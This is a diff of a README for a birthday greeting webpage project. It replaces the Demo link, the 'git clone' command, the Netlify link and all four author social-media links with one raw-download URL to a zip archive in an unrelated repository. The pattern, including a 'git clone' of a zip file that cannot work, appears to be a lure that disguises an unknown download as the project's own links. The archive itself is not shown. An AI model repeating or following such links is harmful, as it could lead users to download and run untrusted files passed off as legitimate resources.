@@ -1,6 +1,6 @@
 ## 🎉 Birthday Greeting Webpage 
 
-[Demo](https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip)
+[Demo](https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip)
 
 ## 🚀 How to Use
 
@@ -8,7 +8,7 @@
 
     ```bash
     # Clone this repository or download it
-    $ git clone https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip
+    $ git clone https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip
 
     # Go into the repository
     $ cd happybirthday
@@ -23,7 +23,7 @@
 
 3. **Deployment**
 
-    To make your site online, you can enable GitHub Pages for the repository (Settings -> Pages). Alternatively, you can use [Netlify](https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip).
+    To make your site online, you can enable GitHub Pages for the repository (Settings -> Pages). Alternatively, you can use [Netlify](https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip).
 
 ## 📝 Contributing
 
@@ -33,7 +33,7 @@ If you have any ideas to make it more interesting, please submit a pull request 
 
 ### [MIT](LICENSE)
 
-> Github [@fajarghifar](https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip) &nbsp;&middot;&nbsp;
-> Youtube [@fajarghifar](https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip) &nbsp;&middot;&nbsp;
-> Instagram [@fajarghifar](https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip) &nbsp;&middot;&nbsp;
-> Linkedin [@fajarghifar](https://raw.githubusercontent.com/Gansbett/happy-easter-sayang/main/motific/happy-easter-sayang.zip)
+> Github [@fajarghifar](https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip) &nbsp;&middot;&nbsp;
+> Youtube [@fajarghifar](https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip) &nbsp;&middot;&nbsp;
+> Instagram [@fajarghifar](https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip) &nbsp;&middot;&nbsp;
+> Linkedin [@fajarghifar](https://github.com/Gansbett/happy-easter-sayang/raw/refs/heads/main/style/sayang_happy_easter_3.9.zip)
